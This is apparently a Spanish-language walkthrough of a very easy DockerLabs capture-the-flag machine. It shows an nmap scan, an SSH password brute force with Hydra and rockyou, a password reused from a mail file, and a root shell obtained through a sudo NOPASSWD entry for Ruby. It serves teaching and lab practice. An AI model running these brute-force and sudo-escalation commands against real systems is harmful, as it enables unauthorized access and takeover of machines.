# Write-up - Escalada con Ruby y enumeración horizontal

**Sitio:** DockerLabs  
**Dificultad:** Muy Fácil  
**Fecha:** 01/06/2025  
**Aprendizaje:**  
- Enumeración horizontal al explorar más allá del home del usuario actual.    
- Importancia de revisar el código fuente de páginas web en busca de comentarios o datos expuestos.    
- Recordar que cuando `sudo -l` muestra un binario sin contraseña (NOPASSWD), el usuario listado puede ejecutarlo con privilegios de root.  

---

## Enumeración y acceso inicial

### 1. Escaneo con Nmap

`sudo nmap -sSV -O 10.88.0.3`

> Resultado:

`22/tcp → SSH (OpenSSH 7.6p1)`  
`80/tcp → HTTP (Apache 2.4.29)`  
`SO: Linux`  

### 2. Revisión del código fuente

Al inspeccionar http://10.88.0.3, se observa el siguiente comentario HTML:

> De : Juan Para: Camilo , te he dejado un correo es importante...

### 3. Ataque de fuerza bruta con Hydra

`hydra -l camilo -P /usr/share/wordlists/rockyou.txt -V ssh://10.88.0.3`

> Credenciales obtenidas:

Usuario: `camilo`  
Contraseña: `password1`  

### 4. Enumeración horizontal

`cd ..`

Se observa una lista de usuarios pero sin contenido útil en sus carpetas.  
Se sigue navegando:  

`cd ../..`    
`cd /var/mail`  

Se encuentra un archivo de texto dentro del directorio de camilo con la siguiente información:  

> Hola Camilo,  
Me voy de vacaciones y no he terminado el trabajo que me dio el jefe.  
Por si acaso lo pide, aquí tienes la contraseña: `2k84dicb`

### 5. Acceso como nuevo usuario (Juan)

`ssh -l juan 10.88.0.3`  

Contraseña: `2k84dicb`  

## Escalada de privilegios

### 6. Verificar comandos ejecutables como sudo  

`sudo -l`

Resultado:  

User juan may run the following commands on db2f0299b72a:  
(ALL) NOPASSWD: /usr/bin/ruby  

Esto indica que `juan` puede ejecutar el binario ruby como `root` sin necesidad de contraseña.

### 7. Ejecución de shell como root

`sudo ruby -e 'exec "/bin/sh"'`

> whoami = `root`
